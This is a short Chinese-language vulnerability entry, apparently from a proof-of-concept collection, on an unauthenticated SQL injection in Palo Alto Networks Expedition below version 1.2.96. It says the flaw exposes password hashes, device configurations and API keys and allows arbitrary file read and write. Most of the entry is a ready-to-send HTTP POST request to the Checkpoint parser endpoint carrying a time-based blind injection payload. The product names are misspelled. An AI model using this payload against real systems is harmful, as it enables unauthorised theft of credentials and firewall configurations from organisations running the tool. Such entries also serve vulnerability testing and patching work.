**漏洞描述：**

Palo Aloto Networks Expendition chekpoint接口存在SQL注入漏洞，攻击者可通过漏洞未授权获取Expedition数据库内容,例如密码哈希、用户名、设备配置和设备API密钥,利用这一点，还可以在Expedition 系统上创建和读取任意文件。

**影响版本：**

Palo Alto Networks Expedition < 1.2.96

**Payload：**

```yaml
POST /bin/configurations/parsers/Checkpoint/CHECKPOINT.php HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded

action=import&type=test&project=pandbRBAC&signatureid=1%20AND%20(SELECT%201234%20FROM%20(SELECT(SLEEP(5)))test)
```

---
